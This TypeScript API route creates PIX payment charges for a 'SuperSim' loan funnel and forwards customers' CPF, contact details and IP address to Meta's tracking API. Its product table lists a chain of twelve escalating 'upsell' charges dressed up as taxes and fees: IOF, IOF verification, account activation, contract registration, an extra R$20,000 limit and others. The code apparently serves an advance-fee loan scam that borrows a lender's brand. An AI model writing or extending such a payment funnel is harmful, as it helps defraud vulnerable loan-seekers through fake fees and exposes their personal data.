import { createFileRoute } from "@tanstack/react-router";
import { z } from "zod";
import { cpfValido } from "../../../lib/cpf-brasil";
import { getClientIp, sendMetaCapiEvent } from "../../../lib/meta-capi";
import {
  freepayErrorMessage,
  freepayRequest,
  isFreepaySuccess,
  normalizeFreepayCreate,
  resolveFreepayEnv,
  shouldFallbackToFreepay,
} from "../../../lib/freepay";
import {
  isPrimarySuccess,
  normalizePrimaryCreate,
  primaryCreate,
  primaryErrorMessage,
  primarySupportsAmount,
  resolvePrimaryEnv,
} from "../../../lib/pay-gateway";

// PIX do funil SuperSim via gateway configurado no env (PIX_GATEWAY_API_KEY).
// Chaves só server-side; nunca expostas no navegador.
const PIX_EXPIRES_IN_DAYS = 1;
// Produção: usa os dados reais do cliente (obrigatórios).
const DEMO_MODE = false;

// Preços em centavos. O navegador envia apenas o upKey; o preço real é definido aqui.
const PRODUCTS: Record<string, { amount: number; title: string; externalRef: string }> = {
  seguro: { amount: 2863, title: "Seguro Prestamista - SuperSim", externalRef: "front" },
  up1: { amount: 2482, title: "IOF - Imposto sobre Operações Financeiras", externalRef: "up1" },
  up2: { amount: 2391, title: "Taxa de Verificação de IOF", externalRef: "up2" },
  up3: { amount: 1868, title: "Seguro Prestamista - Tarifa de Cadastro", externalRef: "up3" },
  up4: { amount: 1720, title: "TENF - Taxa de Emissão da Nota Fiscal", externalRef: "up4" },
  up5: { amount: 1700, title: "Ativar Conta", externalRef: "up5" },
  up6: { amount: 1702, title: "Taxa de Registro do Contrato", externalRef: "up6" },
  up7: { amount: 1406, title: "Taxa - Limite Adicional de R$20.000", externalRef: "up7" },
  up8: { amount: 1406, title: "Taxa de Processamento", externalRef: "up8" },
  up9: { amount: 1199, title: "Aplicativo SuperSim", externalRef: "up9" },
  up10: { amount: 1692, title: "TAC - Taxa de Abertura de Crédito", externalRef: "up10" },
  up11: { amount: 1953, title: "Taxa de Consultoria Financeira", externalRef: "up11" },
  up12: { amount: 3192, title: "Taxa de Processamento Administrativo", externalRef: "up12" },

  seguro_ds: { amount: 1432, title: "Seguro Prestamista - SuperSim", externalRef: "front_ds" },
  up1_ds: { amount: 1241, title: "IOF - Imposto sobre Operações Financeiras", externalRef: "ds1" },
  up2_ds: { amount: 1196, title: "Taxa de Verificação de IOF", externalRef: "ds2" },
  up3_ds: { amount: 1000, title: "Seguro Prestamista - Tarifa de Cadastro", externalRef: "ds3" },
  up4_ds: { amount: 1000, title: "TENF - Taxa de Emissão da Nota Fiscal", externalRef: "ds4" },
  up5_ds: { amount: 1000, title: "Ativar Conta", externalRef: "ds5" },
  up6_ds: { amount: 1000, title: "Taxa de Registro do Contrato", externalRef: "ds6" },
  up7_ds: { amount: 1000, title: "Taxa - Limite Adicional de R$20.000", externalRef: "ds7" },
  up8_ds: { amount: 1000, title: "Taxa de Processamento", externalRef: "ds8" },
  up9_ds: { amount: 1000, title: "Aplicativo SuperSim", externalRef: "ds9" },
  up10_ds: { amount: 1000, title: "TAC - Taxa de Abertura de Crédito", externalRef: "ds10" },
  up11_ds: { amount: 1000, title: "Taxa de Consultoria Financeira", externalRef: "ds11" },
  up12_ds: { amount: 1596, title: "Taxa de Processamento Administrativo", externalRef: "ds12" },
};

// O funil envia null quando um parâmetro/cookie não existe
const utmStr = z.string().max(180).nullable().optional();
const utmsSchema = z
  .object({
    utm_source: utmStr,
    utm_medium: utmStr,
    utm_campaign: utmStr,
    utm_term: utmStr,
    utm_content: utmStr,
    src: utmStr,
    sck: utmStr,
  })
  .default({});

const bodySchema = z.object({
  upKey: z.string().max(40),
  nome: z.string().max(120).optional(),
  cpf: z.string().max(20).optional(),
  email: z.string().max(160).optional(),
  phone: z.string().max(20).optional(),
  eid: z.string().max(80).optional(),
  utms: utmsSchema,
  fbp: z.string().max(255).nullable().optional(),
  fbc: z.string().max(255).nullable().optional(),
  icEventId: z.string().max(100).optional(),
  leadEventId: z.string().max(100).optional(),
  eventSourceUrl: z.string().max(2000).optional(),
});

function cleanText(value: unknown, maxLength = 160): string {
  return (
    String(value ?? "")
      // eslint-disable-next-line no-control-regex -- sanitiza caracteres de controle do input
      .replace(/[\u0000-\u001F\u007F<>]/g, "")
      .trim()
      .slice(0, maxLength)
  );
}

function digitsOnly(value: unknown, maxLength = 20): string {
  return String(value ?? "")
    .replace(/\D/g, "")
    .slice(0, maxLength);
}

function isValidEmail(value: string): boolean {
  return /^[^\s@]{1,64}@[^\s@]{1,255}\.[^\s@]{2,}$/.test(value.trim());
}

function bad(request: Request, message: string, status: number, extra?: Record<string, unknown>) {
  return Response.json(
    { success: false, message, ...extra },
    { status, headers: { "Cache-Control": "no-store" } },
  );
}

export const Route = createFileRoute("/api/public/sup-pix")({
  server: {
    handlers: {
      OPTIONS: async () => new Response(null, { status: 204 }),
      POST: async ({ request }) => {
        let raw: unknown;
        try {
          raw = await request.json();
        } catch {
          return bad(request, "Corpo inválido.", 400);
        }

        const parsed = bodySchema.safeParse(raw);
        if (!parsed.success) {
          console.error("[sup-pix] corpo rejeitado:", JSON.stringify(parsed.error.issues));
          return bad(request, "Corpo inválido.", 422);
        }
        const input = parsed.data;

        const product = PRODUCTS[input.upKey];
        if (!product) return bad(request, "Produto inválido.", 422);
        const amount = product.amount;
        if (amount < 500 || amount > 60000) {
          return bad(
            request,
            "O valor do produto está fora dos limites aceitos pelo gateway.",
            500,
          );
        }

        let name = cleanText(input.nome, 120);
        let email = isValidEmail(input.email ?? "") ? (input.email ?? "").trim() : "";
        let phone = digitsOnly(input.phone, 15);
        let documentNumber = digitsOnly(input.cpf, 14);

        // Modo demo usa os dados públicos de teste da documentação.
        // Ao desativar DEMO_MODE, os dados reais passam a ser obrigatórios.
        if (DEMO_MODE) {
          if (!name) name = "João Silva";
          if (!email) email = "joao@example.com";
          if (!phone) phone = "5511999999999";
          if (!documentNumber) documentNumber = "12345678900";
        } else if (
          !name ||
          !email ||
          phone.length < 10 ||
          (documentNumber.length === 14
            ? !/^[0-9]{14}$/.test(documentNumber)
            : !cpfValido(documentNumber)) // igual ao Bebidas-Chabas (criar-pagamento.php:49)
        ) {
          const faltando: string[] = [];
          if (!name) faltando.push("nome");
          if (!email) faltando.push("e-mail");
          if (phone.length < 10) faltando.push("telefone");
          if (
            documentNumber.length === 14
              ? !/^[0-9]{14}$/.test(documentNumber)
              : !cpfValido(documentNumber)
          )
            faltando.push("cpf");
          console.error(
            "[sup-pix] dados do cliente incompletos:",
            faltando.join(","),
            "| upKey:",
            input.upKey,
          );
          return bad(
            request,
            `Faltam dados para gerar o Pix (${faltando.join(", ")}). Volte uma etapa e preencha novamente.`,
            422,
            { campos: faltando },
          );
        }

        const documentType = documentNumber.length === 14 ? "cnpj" : "cpf";
        const clientIp = getClientIp(request);
        const userAgent = request.headers.get("user-agent") ?? "";
        const metadata: Record<string, string> = {
          order_id: `order_${[...crypto.getRandomValues(new Uint8Array(10))]
            .map((b) => b.toString(16).padStart(2, "0"))
            .join("")}`,
          product_key: input.upKey,
        };
        for (const [key, value] of Object.entries(input.utms)) {
          const clean = cleanText(value, 180);
          if (clean) metadata[key] = clean;
        }

        const orderPayload: Record<string, unknown> = {
          amount,
          payment_method: "pix",
          customer: {
            name,
            email,
            phone,
            document: { type: documentType, number: documentNumber },
          },
          items: [
            {
              title: product.title,
              unit_price: amount,
              quantity: 1,
              tangible: false,
              external_ref: product.externalRef,
            },
          ],
          pix: { expires_in_days: PIX_EXPIRES_IN_DAYS },
          metadata,
        };
        if (clientIp) orderPayload["ip"] = clientIp;

        const primaryEnv = resolvePrimaryEnv();
        const freepayEnv = resolveFreepayEnv();
        let gateway: string;
        let created: { id: string; status: string; qrCode: string; expirationDate: string } | null =
          null;
        let fallbackReason: string | null = null;

        if (primaryEnv.configured && primarySupportsAmount(primaryEnv, amount)) {
          if (primaryEnv.postbackUrl) orderPayload["postback_url"] = primaryEnv.postbackUrl;
          let result: { httpStatus: number; data: Record<string, unknown> };
          try {
            result = await primaryCreate(orderPayload, primaryEnv);
          } catch (error) {
            console.error(
              "[sup-pix] falha de conexão com o gateway primário; sem fallback para evitar duplicidade",
              error,
            );
            return bad(request, "Falha de conexão com o gateway de pagamento.", 502);
          }
          if (isPrimarySuccess(result.httpStatus, result.data)) {
            created = normalizePrimaryCreate(result.data);
            if (!created) {
              console.error(
                "[sup-pix] gateway primário retornou sucesso sem id/código PIX; fallback bloqueado",
              );
              return bad(
                request,
                "A transação foi criada, mas o gateway não retornou o identificador ou o código PIX.",
                502,
              );
            }
            gateway = primaryEnv.kind;
          } else if (shouldFallbackToFreepay(result.httpStatus)) {
            fallbackReason = `rejeição HTTP ${result.httpStatus}`;
            console.error(
              "[sup-pix] gateway primário recusou; tentando FreePay",
              result.httpStatus,
              primaryErrorMessage(result.data, "Rejeição do gateway"),
            );
            gateway = "freepay";
          } else {
            console.error(
              "[sup-pix] falha não definitiva do gateway primário; fallback bloqueado",
              result.httpStatus,
            );
            return bad(request, "Falha temporária no gateway de pagamento.", 502, {
              gatewayHttpStatus: result.httpStatus,
            });
          }
        } else {
          gateway = "freepay";
          if (primaryEnv.configured) {
            fallbackReason = "valor abaixo do mínimo do gateway primário";
            console.log("[sup-pix] valor abaixo do mínimo do primário; usando FreePay");
          }
        }

        if (gateway === "freepay") {
          if (!freepayEnv.publicKey || !freepayEnv.secretKey) {
            console.error(
              "[sup-pix] FreePay escolhida, mas credenciais ausentes.",
              fallbackReason ?? "gateway primário não configurado",
            );
            return bad(request, "Gateway de pagamento indisponível no momento.", 500);
          }
          const freepayPayload = { ...orderPayload };
          if (freepayEnv.postbackUrl) freepayPayload["postback_url"] = freepayEnv.postbackUrl;
          let result: { httpStatus: number; data: Record<string, unknown> };
          try {
            result = await freepayRequest("/v1/payment-transaction/create", {
              method: "POST",
              body: freepayPayload,
              publicKey: freepayEnv.publicKey,
              secretKey: freepayEnv.secretKey,
            });
          } catch (error) {
            console.error("[sup-pix] falha de conexão com a FreePay", error);
            return bad(request, "Falha de conexão com o gateway de pagamento.", 502);
          }
          if (!isFreepaySuccess(result.httpStatus, result.data)) {
            const message = freepayErrorMessage(result.data, "Não foi possível criar a transação.");
            console.error("[sup-pix] FreePay recusou", result.httpStatus, message);
            const status =
              result.httpStatus >= 400 && result.httpStatus <= 599 ? result.httpStatus : 502;
            return bad(request, message, status, { gatewayHttpStatus: result.httpStatus });
          }
          created = normalizeFreepayCreate(result.data);
          if (!created) {
            return bad(
              request,
              "A transação foi criada, mas o gateway não retornou o identificador ou o código PIX.",
              502,
            );
          }
        }

        // Espelho CAPI server-side (InitiateCheckout + Lead) com os MESMOS event_ids
        // gerados no navegador → dedup browser↔CAPI. Fire-and-forget, nunca quebra o PIX.
        const capiBase = {
          email: email || undefined,
          phone: phone || undefined,
          nome: name || undefined,
          cpf: documentNumber || undefined,
          eid: cleanText(input.eid, 80) || undefined,
          fbp: input.fbp ?? undefined,
          fbc: input.fbc ?? undefined,
          clientIp: clientIp || undefined,
          clientUa: userAgent || undefined,
          eventSourceUrl: cleanText(input.eventSourceUrl, 500) || undefined,
        };
        if (input.icEventId) {
          void sendMetaCapiEvent({
            ...capiBase,
            eventName: "InitiateCheckout",
            eventId: cleanText(input.icEventId, 100),
            value: amount / 100,
          });
        }
        if (input.leadEventId) {
          void sendMetaCapiEvent({
            ...capiBase,
            eventName: "Lead",
            eventId: cleanText(input.leadEventId, 100),
          });
        }

        if (!created) {
          return bad(request, "Não foi possível criar a transação.", 502);
        }

        return Response.json(
          {
            success: true,
            txnId: created.id,
            status: created.status,
            amount: amount / 100,
            amountCents: amount,
            qrcode: created.qrCode,
            orderId: metadata["order_id"],
            gateway,
          },
          { status: 201, headers: { "Cache-Control": "no-store" } },
        );
      },
    },
  },
});
